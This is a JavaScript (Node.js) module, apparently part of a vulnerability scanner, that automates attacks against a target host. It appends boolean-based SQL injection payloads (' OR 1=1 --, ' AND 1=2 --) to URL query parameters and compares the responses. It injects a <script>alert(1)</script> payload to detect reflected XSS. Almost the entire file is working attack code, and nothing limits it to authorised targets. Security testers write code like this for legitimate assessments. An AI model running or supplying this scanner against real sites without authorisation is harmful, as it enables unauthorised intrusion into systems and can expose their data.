const axios = require("axios");

const extractParams = (url) => {
    try {
        const u = new URL(url);
        const params = [];

        for (let [key, value] of u.searchParams.entries()) {
            params.push({ key, value });
        }

        return params;
    } catch {
        return [];
    }
};

// ----------------------
// SQLi ATTACK (BOOLEAN BASED)
// ----------------------
const runSQLi = async (target, links = []) => {

    const payloadPairs = [
        {
            truePayload: "' OR 1=1 --",
            falsePayload: "' AND 1=2 --"
        }
    ];

    let paths = [];

    for (let link of links) {
        if (link.includes("?")) {
            paths.push(link);
        }
    }

    paths = [...new Set(paths)];

    if (paths.length === 0) {
        paths = ["/?id="];
    }

    for (let path of paths) {

        let baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("BASE URL:", baseUrl);

        const params = extractParams(baseUrl);
        if (params.length === 0) continue;

        for (let pair of payloadPairs) {

            for (let param of params) {

                let trueUrl = new URL(baseUrl);
                let falseUrl = new URL(baseUrl);

                trueUrl.searchParams.set(param.key, param.value + pair.truePayload);
                falseUrl.searchParams.set(param.key, param.value + pair.falsePayload);

                console.log(`🧪 TRUE:`, trueUrl.toString());
                console.log(`🧪 FALSE:`, falseUrl.toString());

                try {
                    const trueRes = await axios.get(trueUrl.toString(), {
                        timeout: 10000,
                        validateStatus: () => true
                    });

                    const falseRes = await axios.get(falseUrl.toString(), {
                        timeout: 10000,
                        validateStatus: () => true
                    });

                    const trueBody = trueRes.data.toString();
                    const falseBody = falseRes.data.toString();

                    if (trueBody !== falseBody) {
                        return {
                            type: "sqli",
                            vulnerable: true,
                            technique: "boolean-based",
                            payload: pair.truePayload,
                            param: param.key,
                            target
                        };
                    }

                } catch (err) {
                    continue;
                }
            }
        }
    }

    return {
        type: "sqli",
        vulnerable: false,
        target
    };
};

// ----------------------
// XSS 
// ----------------------
const runXSS = async (target, links = []) => {

    const payload = `<script>alert(1)</script>`;

    let paths = [];

    for (let link of links) {
        if (link.includes("?")) {
            paths.push(link);
        }
    }

    paths = [...new Set(paths)];

    if (paths.length === 0) {
        paths = [`http://${target}/?q=`];
    }

    for (let path of paths) {

        let baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("🌐 XSS BASE:", baseUrl);

        const params = extractParams(baseUrl);

        if (params.length === 0) continue;

        for (let param of params) {

            let testUrl = new URL(baseUrl);

            testUrl.searchParams.set(param.key, payload);

            const url = testUrl.toString();

            console.log(`🧪 XSS Testing [${param.key}]:`, url);

            try {
                const res = await axios.get(url, {
                    timeout: 10000,
                    validateStatus: () => true
                });

                const body = res.data.toString();

                // ✅ SIMPLE REFLECTION CHECK
                if (body.includes(payload)) {
                    return {
                        type: "xss",
                        vulnerable: true,
                        technique: "reflected",
                        payload,
                        param: param.key,
                        url,
                        target
                    };
                }

            } catch (err) {
                continue;
            }
        }
    }

    return {
        type: "xss",
        vulnerable: false,
        target
    };
};

// ----------------------
// MAIN EXECUTOR
// ----------------------
const executeAttacks = async (actions, target, links = []) => {
    const results = [];

    for (let act of actions) {
        if (act.type === "sqli") {
            results.push(await runSQLi(target, links));
        }

        if (act.type === "xss") {
            results.push(await runXSS(target, links));
        }
    }

    return results;
};

module.exports = executeAttacks;